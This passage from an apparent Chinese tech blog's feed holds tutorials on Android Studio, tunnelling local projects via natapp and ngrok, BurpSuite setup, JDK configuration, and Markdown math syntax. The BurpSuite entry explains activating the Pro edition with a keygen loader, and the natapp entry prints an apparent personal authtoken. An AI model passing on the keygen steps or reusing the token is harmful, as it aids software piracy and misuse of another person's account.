      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Android studio</tag>
      
      <tag>小米便签</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android studio安装</title>
    <link href="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/"/>
    <url>/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-studio安装（Win10）"><a href="#Android-studio安装（Win10）" class="headerlink" title="Android studio安装（Win10）"></a>Android studio安装（Win10）</h1><p>Android Studio官网：<a href="https://developer.android.google.cn/studio?hl=zh-cn">Download Android Studio and SDK tools  | Android Developers (google.cn)</a></p><p>这里我安装的是： <strong>android-studio-2020.3.1.24-windows.exe</strong> 。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>双击进行安装，<strong>Next</strong> -&gt; <strong>Next</strong> -&gt; <strong>Next</strong>（可以修改安装目录） -&gt; <strong>Install</strong> -&gt; <strong>Next</strong> -&gt; <strong>finish</strong> ，完成安装。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>1、选择 <strong>Do not import settings</strong> ，点击 <strong>OK</strong> 。（第一次安装没什么配置文件需要导入，所以我们选择不导入）</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/48bfd903e65e84cd715a1dfb938dcaf6.bmp" alt="capture_20210920155637708" style="zoom:80%;"></p><p>2、选择 <strong>Don’t sent</strong> 。 （选择不发送，因为可能连不上Google，导致后台一直在请求）</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/a9963640c87bd594fefa64fc0d2b89d0.png" alt="image-20210920155740802" style="zoom:67%;"></p><p>3、选择 <strong>Cancel</strong> 。（显示没找到SDK，这里先不管，后面再安装）</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/6d63b9a3a61bfef5d61eafaed1c4ed52.png" alt="image-20210920155811855"></p><p>4、点击 <strong>Next</strong> ，选择 <strong>Custom</strong> ，点击 <strong>Next</strong> 。（这里我选择自定义，标准的话一些东西不需要配置，但是SDK可能会安装到C盘）</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/153daf381fe09e1885943abb6d8548de.png" alt="image-20210920160252155" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/8ee8ffe8975a1dcd0a7d82283479214a.png" alt="image-20210920160326710" style="zoom:50%;"></p><p> 5、选择 <strong>jdk</strong> ，这里我选择 <strong>Android Studio</strong> 自带的，当然也可以选择自己下载的 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/cdc6d2e77ba5f672c7b05440c301ef6b.png" alt="image-20210920161126051" style="zoom:50%;"></p><p>6、安装 <strong>SDK</strong> ，建议全选吧，免得后面再安装麻烦，当然现在不安装后面还可以安装 。安装目录可以更改一下。</p><blockquote><p>可能会出现有些选项选不上，那就不选了，不用担心，后面会提示你安装的，点击下载就好了 。</p></blockquote><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/014f27be92b43b28cbb349a9ee1bd151.png" alt="image-20210920171813558" style="zoom:50%;"></p><p>7、默认就好，<strong>Next</strong> ，等待安装完成，<strong>Finish</strong> 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/061750dfb84f74aaaf24b27e0677460b.png" alt="image-20210920171831534" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/84644f8c81ba85fe535a8653766a80fb.png" alt="image-20210920172458074" style="zoom:50%;"></p><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><p>1、选择 <strong>New Project</strong> 新建工程，选择 <strong>Empty Activity</strong> ，<strong>Next</strong> 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/5753cb8470c3a80fbc5c34a24e3e4680.png" alt="image-20210920185303147" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/bf09e6aa08269fd359b50b25f0b63da4.png" alt="image-20210920185321543" style="zoom:50%;"></p><p>2、填写相关信息，<strong>Finish</strong> 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/b64ffc7dd1c7167686b432b0a0f463c9.bmp" alt="capture_20210920185530531" style="zoom:50%;"></p><p>3、等待 <strong>Gradle</strong> 构建完成，可能会报错 ，按照提示<strong>安装丢失的 SDK 包</strong> 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/dee0a6c0f0d5f7d0bdfdcf17fe54d67d.png" alt="QQ图片20210921143209"></p><p>4、完成 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/4a6158564d4519475597b5830cd5d38a.png" alt="image-20210920190423180" style="zoom:50%;"></p><h2 id="添加虚拟机"><a href="#添加虚拟机" class="headerlink" title="添加虚拟机"></a>添加虚拟机</h2><blockquote><p>这里可以通过连接手机直接进行测试，从而跳过添加虚拟机 。</p></blockquote><p>1、找到下图倒数第二个 <strong>AVD Manager</strong>，单击打开</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/a619b8678d15bc3ccb1e7e51503ec151.png" alt="image-20210920215908969"></p><p>2、单击 <strong>Create Virtual Devices</strong> 添加虚拟机 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/b8e79f3fd6eecf767579118f08b5b132.png" alt="image-20210920202253997" style="zoom:50%;"></p><p>3、选择机型和系统内核（系统内核需要下载，选择想用的点 <strong>Download</strong> 下载就可）</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/5b358da803c9d18e2654bbd1285da0c4.png" alt="image-20210920202349166" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/cf2ac8d3d94c52c4d610bdc5158c9ae1.png" alt="image-20210920203219851" style="zoom:50%;"></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>点击<strong>小锤子</strong>进行创建工程，点击<strong>三角形</strong>进行运行，得到运行在虚拟手机上的效果 。</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/05ed62b40e371d4c97b9ff099f186194.png" alt="image-20210920203307743"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/bfce8344ef05cd8181b36e9a77299f6b.png" alt="image-20210920203426338" style="zoom:50%;"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Android studio</tag>
      
      <tag>win10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过外网访问Java本地的项目-内网穿透</title>
    <link href="/2021/09/20/Code/Java/%E9%80%9A%E8%BF%87%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AEJava%E6%9C%AC%E5%9C%B0%E7%9A%84%E9%A1%B9%E7%9B%AE-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2021/09/20/Code/Java/%E9%80%9A%E8%BF%87%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AEJava%E6%9C%AC%E5%9C%B0%E7%9A%84%E9%A1%B9%E7%9B%AE-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="通过外网访问Java本地的项目-内网穿透"><a href="#通过外网访问Java本地的项目-内网穿透" class="headerlink" title="通过外网访问Java本地的项目-内网穿透"></a>通过外网访问Java本地的项目-内网穿透</h1><p>一般自己在电脑上写了一个项目 ，但如果不发布的话就只有自己的本地服务能访问到 ，那如果需要给别人访问就需要一个域名和服务器 ，当然这是需要成本的。</p><h2 id="一、natapp"><a href="#一、natapp" class="headerlink" title="一、natapp"></a>一、natapp</h2><p><a href="https://natapp.cn/">NATAPP-内网穿透 基于ngrok的国内高速内网映射工具</a></p><h3 id="1、注册用户"><a href="#1、注册用户" class="headerlink" title="1、注册用户"></a>1、注册用户</h3><h3 id="2、下载客户端"><a href="#2、下载客户端" class="headerlink" title="2、下载客户端"></a>2、下载客户端</h3><h3 id="3、复制authtoken"><a href="#3、复制authtoken" class="headerlink" title="3、复制authtoken"></a>3、复制authtoken</h3><p>登陆进去以后查看，我的隧道-&gt;authtoken 。复制，等下要在客户端用到！</p><h3 id="4、使用命令登录"><a href="#4、使用命令登录" class="headerlink" title="4、使用命令登录"></a>4、使用命令登录</h3><p>在cmd中输入：natapp -authtoken=ad6b3f11eb72f44b    </p><p>可以看到 那个<a href="http://pebq83.natappfree.cc域名映射的是127.0.0.1：8080">http://pebq83.natappfree.cc域名映射的是127.0.0.1：8080</a></p><p>然后tomcat 部署自己的项目，启动以后，用<a href="http://pebq83.natappfree.cc域名加上自己项目名称就可以外网访问了">http://pebq83.natappfree.cc域名加上自己项目名称就可以外网访问了</a></p><h2 id="二、ngrok"><a href="#二、ngrok" class="headerlink" title="二、ngrok"></a>二、ngrok</h2><p><a href="https://www.ngrok.cc/">Sunny-Ngrok内网转发内网穿透 - 国内内网映射服务器</a></p><h3 id="1、注册、购买"><a href="#1、注册、购买" class="headerlink" title="1、注册、购买"></a>1、注册、购买</h3><p>注册登录后进入到主页，点击隧道管理中的开通隧道 ，这里的服务器有需要购买的也有免费的 ，当然了免费的网速就慢了点而且访问的人多了也会很卡 ，但是用于测试或者将项目给别人浏览还是可以的 ，选择到免费服务器 ，点击立即购买。</p><p>购买后进入到这里协议什么的看个人吧，隧道名称是自定义的 ，前置域名根据它的填写规则来填写就好了，本地端口它一开始默认是127.0.0.1:80 ，那么就需要修改冒号后面的端口号 ，替换成自己本地项目的端口号（我这里是8080），后面俩个可以不用管，点击确认添加 ， 确定开通</p><h3 id="2、下载客户端-1"><a href="#2、下载客户端-1" class="headerlink" title="2、下载客户端"></a>2、下载客户端</h3><p>开通后进入到隧道管理，点击下载 ，点进去后选择与自己电脑相匹配的版本 ，下载解压</p><h3 id="3、启动"><a href="#3、启动" class="headerlink" title="3、启动"></a>3、启动</h3><p>点击启动工具 ，弹出一个窗口。</p><p>需要自己的客户端id ，就是开通隧道后分配的隧道id ，将隧道id复制粘贴到冒号后面点击回车。</p><p>点击回车后将红框内的地址复制在浏览器中粘贴，这样就可以了。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite安装配置</title>
    <link href="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="BurpSuite配置激活"><a href="#BurpSuite配置激活" class="headerlink" title="BurpSuite配置激活"></a>BurpSuite配置激活</h2><p>1、下载、解压完成后双击打开 <strong>burp-loader-keygen.jar</strong> 。</p><blockquote><p>工具运行需要 <strong>Java</strong> 环境，请自行安装，此处不赘述。</p></blockquote><p>2、修改 <strong>License Text</strong> 为任意值，这里我改为 <code>wzz</code> ，点击 <code>run</code> 启动 <strong>burp suite</strong> 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/14ba1793e26877052daf94e88b01a682.jpg" alt="Inkedcapture_20210919225415263_LI" style="zoom:67%;"></p><blockquote><p>如果上述方式没有成功启动 <strong>burpsuite</strong>，打开 <strong>cmd</strong>，进入 <strong>burp-loader-keygen.jar</strong> 所在目录，执行 <strong>Loader Command</strong> ：<code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.33.jar</code> 。</p></blockquote><p>成功打开 <strong>burpsuite</strong> 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/886d92377bff862eb57f8506fd3b28b2.png" alt="image-20210919230835974" style="zoom:67%;"></p><p>3、将 <strong>Keygen</strong> 中 <strong>License</strong> 复制粘贴到 <strong>burpsuite</strong> 中，点击 <strong>Next</strong> ，然后点击 <strong>Manual activation</strong> 。</p><p>4、点击 <strong>Copy request</strong> ，将字符串粘贴到 <strong>keygen</strong> 的 <strong>Activation Request</strong> 里，然后 <strong>Activation Response</strong> 框里就有了结果，再复制 <strong>Activation Response</strong> 中的内容，将字符串粘贴到 <strong>BurpSuite</strong> 剩下的那个框里，再点击 <strong>Next</strong> 显示激活成功，点击 <strong>finish</strong> 完成 。 </p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/2c20e2cdafc3cb5e58f8f958e4cfa318.png" alt="image-20210919231613926" style="zoom:50%;"></p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/9c85cf8de1ee911c7a7740909048c3e1.png" alt="image-20210919231758621" style="zoom:50%;"></p><p>5、然后点击 <strong>Next</strong> ，再点击 <strong>Start Burp</strong> ，得到<strong>burpsuite</strong> 主界面 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/fc235d64edad2dfd92fbeedc70df17fe.png" alt="image-20210919231927976" style="zoom:50%;"></p><p>6、激活之后，不能通过双击 <strong>BurpSuite</strong> 主程序来启动，否则启动之后还是需要重新激活，两个文件必须放在一个目录下，启动方式有两种：</p><ul><li><p>通过 <strong>keygen</strong> 上的 <strong>run</strong> 按钮来启动</p></li><li><p>在文件目录下执行 <code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.33.jar</code> 来启动 。为了方便，可以将命令保存为一个 <strong>bat</strong> 。</p></li></ul><h2 id="BurpSuite设置代理"><a href="#BurpSuite设置代理" class="headerlink" title="BurpSuite设置代理"></a>BurpSuite设置代理</h2><p>这里推荐<strong>火狐浏览器</strong>来配合 <strong>burp</strong> 使用 。</p><h3 id="1、设置浏览器代理"><a href="#1、设置浏览器代理" class="headerlink" title="1、设置浏览器代理"></a>1、设置浏览器代理</h3><p>1）打开<strong>设置</strong>，搜索<strong>代理</strong>，点击<strong>设置</strong> 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/f84f1111f88685d6e31de3a5c3cedb4e.png" alt="image-20210920112144075" style="zoom:67%;"></p><p>2）改为<strong>手动配置代理</strong> ，设置如图所示 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/b8251eef95c2414f69994ccb258da0a9.png" alt="image-20210920112121849" style="zoom:50%;"></p><p>3）输入 <code>127.0.0.1:8080</code> ，点击回车，进入 <strong>burp</strong> 证书下载页面，点击右上角，下载证书 。</p><p>4）打开<strong>设置</strong>，搜索<strong>证书</strong>，点击<strong>查看证书</strong></p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/74185b85b1ef83c10ff34fd1e54ae108.png" alt="image-20210920112618645" style="zoom:67%;"></p><p>5）点击<strong>导入</strong>，导入刚刚下载的 <strong>burp 证书</strong>，确定，这样就可以使用 <strong>burp</strong> 抓取 <strong>https</strong> 请求了 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/90c60a8ac3af0171a0cf24e91a15793d.png" alt="image-20210920112654665" style="zoom:50%;"></p><p>代理设置成功之后，访问网页是访问不了的，因为我们没有将请求转发，接下来就需要配置 burp 来转发浏览器的请求。</p><h3 id="2、配置-burp-监听端口"><a href="#2、配置-burp-监听端口" class="headerlink" title="2、配置 burp 监听端口"></a>2、配置 burp 监听端口</h3><p>打开<strong>burp</strong> ，在监听的端口设置与代理相同的端口 。</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/067b6a51baa25dd46bf5869b72bc5761.png" alt="image-20210920112901889" style="zoom:67%;"></p>]]></content>
    
    
    <categories>
      
      <category>BurpSuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>BurpSuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java环境安装与配置</title>
    <link href="/2021/09/13/Code/Java/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/09/13/Code/Java/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="安装-JDK-并配置-Java-环境"><a href="#安装-JDK-并配置-Java-环境" class="headerlink" title="安装 JDK 并配置 Java 环境"></a>安装 JDK 并配置 Java 环境</h1><p>可以自行百度搜索，下载相应版本的 <code>JDK</code> ，这里我安装的 <strong>jdk-8u301-windows-x64.exe</strong> 。</p><p><code>Java 8</code> 下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">Java SE Development Kit 8 - Downloads (oracle.com)</a></p><p><code>Java</code> 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">Java SE - Downloads | Oracle Technology Network | Oracle</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里建议直接默认安装，如果 <code>C 盘</code> 空间不够，可以更换其他目录，但一定要记住安装路径，默认安装一般会安装在 <code>C:\Program Files\Java</code> 。</p><blockquote><p>最好安装在 C 盘，以免后面出现问题 。</p></blockquote><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>右击 <code>此电脑</code> 打开 <code>属性</code> ，搜索 <code>环境</code> ，点击<strong>「编辑系统环境变量」-&gt;「环境变量」</strong> 。</p><p>在 <code>系统变量</code> 中，点击 <code>新建</code> ，输入以下内容：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">变量名：JAVA_HOME<br>变量值：C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Java\jdk1.8.0_301</span>    <span class="hljs-comment">#安装的路径</span><br></code></pre></td></tr></table></figure><p>再次点击 <code>新建</code> ，输入以下内容：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">变量名：CLASSPATH<br>变量值：.;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\d</span>t.jar;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\t</span>ools.jar;<br></code></pre></td></tr></table></figure><p>在 <code>系统变量</code> 中，找到 <code>Path</code> ，双击打开，点击 <code>新建</code> ，输入以下内容：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\b</span>in<br><span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\j</span>re<span class="hljs-symbol">\b</span>in<br></code></pre></td></tr></table></figure><p>完成后一直点确定即可 。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>安装配置完成后，打开 <code>cmd</code> 查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\13562&gt;javac -version<br>javac 1.8.0_301<br><br>C:\Users\13562&gt;java -version<br>java version &quot;1.8.0_301&quot;<br>Java(TM) SE Runtime Environment (build 1.8.0_301-b09)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.301-b09, mixed mode)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>env</tag>
      
      <tag>Java</tag>
      
      <tag>JDK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown教程</title>
    <link href="/2021/08/26/MessUp/Markdown%E6%95%99%E7%A8%8B/"/>
    <url>/2021/08/26/MessUp/Markdown%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。</p><p>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。</p><h2 id="Markdown数学公式"><a href="#Markdown数学公式" class="headerlink" title="Markdown数学公式"></a>Markdown数学公式</h2><blockquote><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_18150255/article/details/88040858">Markdown中数学公式及符号整理 会飞的鱼的博客</a></li></ul></blockquote><h3 id="行内与独行"><a href="#行内与独行" class="headerlink" title="行内与独行"></a>行内与独行</h3><ol><li>行内公式：将公式插入到本行内，符号：<script type="math/tex">公式内容</script>，如：$xyz$</li><li>独行公式：将公式插入到新的一行内，并且居中，符号：<script type="math/tex">$公式内容$$$，如：</script>xyz$$</li></ol><h3 id="上标、下标与组合"><a href="#上标、下标与组合" class="headerlink" title="上标、下标与组合"></a>上标、下标与组合</h3><ol><li>上标符号，符号：<code>^</code>，如：$x^4$</li><li>下标符号，符号：<code>_</code>，如：$x_1$</li><li>组合符号，符号：<code>&#123;&#125;</code>，如：${16}<em>{8}O{2+}</em>{2}$</li></ol><h3 id="汉字、字体与格式"><a href="#汉字、字体与格式" class="headerlink" title="汉字、字体与格式"></a>汉字、字体与格式</h3><ol><li>汉字形式，符号：<code>\mbox&#123;&#125;</code>，如：$V_{\mbox{初始}}$</li><li>字体控制，符号：<code>\displaystyle</code>，如：$\displaystyle \frac{x+y}{y+z}$</li><li>下划线符号，符号：<code>\underline</code>，如：$\underline{x+y}$</li><li>标签，符号<code>\tag&#123;数字&#125;</code>，如：$\tag{11}$</li><li>上大括号，符号：<code>\overbrace&#123;算式&#125;</code>，如：$\overbrace{a+b+c+d}^{2.0}$</li><li>下大括号，符号：<code>\underbrace&#123;算式&#125;</code>，如：$a+\underbrace{b+c}_{1.0}+d$</li><li>上位符号，符号：<code>\stacrel&#123;上位符号&#125;&#123;基位符号&#125;</code>，如：$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</li></ol><h3 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h3><ol><li>两个quad空格，符号：<code>\qquad</code>，如：$x \qquad y$</li><li>quad空格，符号：<code>\quad</code>，如：$x \quad y$</li><li>大空格，符号 <code>\</code>，如：$x \ y$</li><li>中空格，符号 <code>\:</code>，如：$x \: y$</li><li>小空格，符号 <code>\,</code>，如：$x \, y$</li><li>没有空格，符号 `` ，如：$xy$</li><li>紧贴，符号 <code>\!</code> ，如：$x ! y$</li></ol><h3 id="定界符与组合"><a href="#定界符与组合" class="headerlink" title="定界符与组合"></a>定界符与组合</h3><ol><li>括号，符号：<code>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>，如：$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$</li><li>中括号，符号：<code>[]</code>，如：$[x+y]$</li><li>大括号，符号：<code>\&#123; \&#125;</code>，如：${x+y}$</li><li>自适应括号，符号：<code>\left \right</code>，如：$\left(x\right)$，$\left(x{yz}\right)$</li><li>组合公式，符号：<code>&#123;上位公式 \choose 下位公式&#125;</code>，如：${n+1 \choose k}={n \choose k}+{n \choose k-1}$</li><li>组合公式，符号：<code>&#123;上位公式 \atop 下位公式&#125;</code>，如：$\sum<em>{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A</em>{k<em>0}A</em>{k_1}\cdots$</li><li>大括号，符号：<code>\lbrace  \rbrace</code>，如：$\lbrace a+x \rbrace$</li><li>尖括号，符号：<code>\langle  \rangle</code>，如：$\langle x \rangle$</li><li>上取整，符号：<code>\lceil  \rceil</code>，如：$\lceil \frac{x}{2} \rceil$</li><li>下取整，符号：<code>\lfloor  \rfloor</code>，如：$\lfloor x \rfloor$</li><li>原始括号，符号：<code>\lbrace  \rbrace</code>，如：$\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \rbrace$</li><li>全包括号，符号：<code>\left\lbrace  \right\rbrace</code>，如：$\left\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \right\rbrace$</li></ol><h3 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h3><ol><li>加法运算，符号：<code>+</code>，如：$x+y=z$</li><li>减法运算，符号：<code>-</code>，如：$x-y=z$</li><li>加减运算，符号：<code>\pm</code>，如：$x \pm y=z$</li><li>减甲运算，符号：<code>\mp</code>，如：$x \mp y=z$</li><li>乘法运算，符号：<code>\times</code>，如：$x \times y=z$</li><li>点乘运算，符号：<code>\cdot</code>，如：$x \cdot y=z$</li><li>星乘运算，符号：<code>\ast</code>，如：$x \ast y=z$</li><li>除法运算，符号：<code>\div</code>，如：$x \div y=z$</li><li>斜法运算，符号：<code>/</code>，如：$x/y=z$</li><li>分式表示，符号：<code>\frac&#123;分子&#125;&#123;分母&#125;</code>，如：$\frac{x+y}{y+z}$</li><li>分式表示，符号：<code>&#123;分子&#125; \voer &#123;分母&#125;</code>，如：${x+y} \over {y+z}$</li><li>绝对值表示，符号：<code>|公式|</code>，如：$|x+y|$</li></ol><h3 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h3><ol><li>平均数运算，符号：<code>\overline&#123;算式&#125;</code>，如：$\overline{xyz}$</li><li>开二次方运算，符号：<code>\sqrt</code>，如：$\sqrt x$</li><li>开方运算，符号：<code>\sqrt[开方数]&#123;被开方数&#125;</code>，如：$\sqrt[3]{x+y}$</li><li>对数运算，符号：<code>\log</code>，如：$\log(x)$</li><li>对数运算，符号：<code>\lg</code>，如：$\lg(x)$</li><li>对数运算，符号：<code>\ln</code>，如：$\ln(x)$</li><li>极限运算，符号：<code>\lim</code>，如：$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>极限运算，符号：<code>\displaystyle \lim</code>，如：$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>求和运算，符号：<code>\sum</code>，如：$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>求和运算，符号：<code>\displaystyle \sum</code>，如：$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>累乘运算，符号：<code>\prod</code>，如：$\prod ^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>积分运算，符号：<code>\int</code>，如：$\int^{\infty}_{0}{x{\rm d}x}$</li><li>积分运算，符号：<code>\displaystyle \int</code>，如：$\displaystyle \int^{\infty}_{0}{xdx}$</li><li>微分运算，符号：<code>\partial</code>，如：$\frac{\partial x}{\partial y}$</li><li>符号：<code>\oint</code>，如：$\oint$</li><li>矩阵表示，符号：<code>\begin&#123;matrix&#125; \end&#123;matrix&#125;</code>，如：$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;6 &amp;7 \ 8 &amp;\vdots &amp;\ddots &amp;\vdots &amp;14 \ 15 &amp;16 &amp;\cdots &amp;20 &amp;21 \end{matrix} \right]$</li></ol><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><ol><li>等于运算，符号：<code>=</code>，如：$x+y=z$</li><li>大于运算，符号：<code>&gt;</code>，如：$x+y&gt;z$</li><li>小于运算，符号：<code>&lt;</code>，如：$x+y&lt;z$</li><li>大于等于运算，符号：<code>\geq</code>，如：$x+y \geq z$</li><li>小于等于运算，符号：<code>\leq</code>，如：$x+y \leq z$</li><li>不等于运算，符号：<code>\neq</code>，如：$x+y \neq z$</li><li>不大于等于运算，符号：<code>\ngeq</code>，如：$x+y \ngeq z$</li><li>不大于等于运算，符号：<code>\not\geq</code>，如：$x+y \not\geq z$</li><li>不小于等于运算，符号：<code>\nleq</code>，如：$x+y \nleq z$</li><li>不小于等于运算，符号：<code>\not\leq</code>，如：$x+y \not\leq z$</li><li>约等于运算，符号：<code>\approx</code>，如：$x+y \approx z$</li><li>恒定等于运算，符号：<code>\equiv</code>，如：$x+y \equiv z$</li></ol><h3 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h3><ol><li>属于运算，符号：<code>\in</code>，如：$x \in y$</li><li>不属于运算，符号：<code>\notin</code>，如：$x \notin y$</li><li>不属于运算，符号：<code>\not\in</code>，如：$x \not\in y$</li><li>子集运算，符号：<code>\subset</code>，如：$x \subset y$</li><li>子集运算，符号：<code>\supset</code>，如：$x \supset y$</li><li>真子集运算，符号：<code>\subseteq</code>，如：$x \subseteq y$</li><li>非真子集运算，符号：<code>\subsetneq</code>，如：$x \subsetneq 